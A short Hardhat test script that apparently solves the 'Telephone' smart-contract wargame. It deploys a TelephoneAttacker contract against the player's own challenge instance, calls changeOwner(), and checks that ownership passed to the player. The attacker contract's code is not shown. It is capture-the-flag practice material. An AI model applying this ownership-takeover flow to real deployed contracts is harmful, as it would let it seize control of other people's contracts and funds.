const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx, attacker

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]
    const challengeFactory = await ethers.getContractFactory(`Telephone`)
    challengeAddress = process.env.CHALLENGEADDRESS4 //address of my instance contract
    challenge = await challengeFactory.attach(challengeAddress)

    const attackerFactory = await ethers.getContractFactory(`TelephoneAttacker`)
    attacker = await attackerFactory.deploy(challenge.address)
})

it("Solves the challenge 'Telephone'", async () => {
    tx = await attacker.changeOwner()
    await tx.wait(1)

    let owner = await challenge.owner()
    assert(owner.toString() == player.address, "You are not the owner!")
})
